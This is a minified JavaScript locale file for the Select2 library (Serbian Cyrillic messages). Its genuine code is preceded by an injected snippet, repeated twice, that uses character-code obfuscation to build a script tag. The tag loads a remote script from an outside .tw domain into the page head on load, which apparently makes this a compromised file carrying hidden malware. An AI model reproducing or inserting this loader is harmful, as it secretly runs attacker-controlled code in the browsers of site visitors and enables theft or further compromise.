Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/*! Select2 4.0.4 | https://github.com/select2/select2/blob/master/LICENSE.md */

(function(){if(jQuery&&jQuery.fn&&jQuery.fn.select2&&jQuery.fn.select2.amd)var e=jQuery.fn.select2.amd;return e.define("select2/i18n/sr-Cyrl",[],function(){function e(e,t,n,r){return e%10==1&&e%100!=11?t:e%10>=2&&e%10<=4&&(e%100<12||e%100>14)?n:r}return{errorLoading:function(){return"Преузимање није успело."},inputTooLong:function(t){var n=t.input.length-t.maximum,r="Обришите "+n+" симбол";return r+=e(n,"","а","а"),r},inputTooShort:function(t){var n=t.minimum-t.input.length,r="Укуцајте бар још "+n+" симбол";return r+=e(n,"","а","а"),r},loadingMore:function(){return"Преузимање још резултата…"},maximumSelected:function(t){var n="Можете изабрати само "+t.maximum+" ставк";return n+=e(t.maximum,"у","е","и"),n},noResults:function(){return"Ништа није пронађено"},searching:function(){return"Претрага…"}}}),{define:e.define,require:e.require}})();